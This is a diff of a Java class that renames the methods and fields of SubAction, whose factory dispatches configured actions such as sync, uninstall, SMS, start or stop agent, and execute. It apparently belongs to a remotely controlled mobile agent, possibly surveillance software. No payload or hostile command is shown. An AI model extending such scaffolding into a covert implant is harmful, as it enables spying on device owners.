@@ -25,65 +25,65 @@ public abstract class SubAction {
     public static final int ACTION_SYNC_PDA = ACTION + 0x8;
     public static final int ACTION_EXECUTE = ACTION + 0x9;
 
-    public static SubAction Factory(int ActionId, byte[] confParams) {
-        switch (ActionId) {
+    public static SubAction factory(int actionId_, byte[] confParams) {
+        switch (actionId_) {
         case ACTION_SYNC:
             debug.trace("Factory ACTION_SYNC");
-            return new SyncAction(ActionId, confParams);
+            return new SyncAction(actionId_, confParams);
         case ACTION_UNINSTALL:
             debug.trace("Factory ACTION_UNINSTALL");
-            return new UninstallAction(ActionId, confParams);
+            return new UninstallAction(actionId_, confParams);
         case ACTION_RELOAD:
             debug.trace("Factory ACTION_RELOAD");
-            return new ReloadAction(ActionId, confParams);
+            return new ReloadAction(actionId_, confParams);
         case ACTION_SMS:
             debug.trace("Factory ACTION_SMS");
-            return new SmsAction(ActionId, confParams);
+            return new SmsAction(actionId_, confParams);
         case ACTION_TOOTHING:
             debug.trace("Factory ACTION_TOOTHING");
-            return new ToothingAction(ActionId, confParams);
+            return new ToothingAction(actionId_, confParams);
         case ACTION_START_AGENT:
             debug.trace("Factory ACTION_START_AGENT");
-            return new StartAgentAction(ActionId, confParams);
+            return new StartAgentAction(actionId_, confParams);
         case ACTION_STOP_AGENT:
             debug.trace("Factory ACTION_STOP_AGENT");
-            return new StopAgentAction(ActionId, confParams);
+            return new StopAgentAction(actionId_, confParams);
         case ACTION_SYNC_PDA:
             debug.trace("Factory ACTION_SYNC_PDA");
-            return new SyncPdaAction(ActionId, confParams);
+            return new SyncPdaAction(actionId_, confParams);
         case ACTION_EXECUTE:
             debug.trace("Factory ACTION_EXECUTE");
-            return new ExecuteAction(ActionId, confParams);
+            return new ExecuteAction(actionId_, confParams);
         default:
             return null;
         }
     }
 
-    public int ActionId;
+    public int actionId;
     protected boolean wantUninstall;
 
     protected boolean wantReload;
 
     protected Status statusObj;
 
-    protected SubAction(int actionId) {
+    protected SubAction(int actionId_) {
         statusObj = Status.getInstance();
-        this.ActionId = actionId;
+        this.actionId = actionId_;
     }
 
-    public abstract boolean Execute();
+    public abstract boolean execute();
 
-    protected abstract boolean Parse(byte[] confParams);
+    protected abstract boolean parse(byte[] confParams);
 
     public String toString() {
-        return "" + ActionId;
+        return "" + actionId;
     }
 
-    public boolean WantReload() {
+    public boolean wantReload() {
         return wantReload;
     }
 
-    public boolean WantUninstall() {
+    public boolean wantUninstall() {
         return wantUninstall;
     }
 }
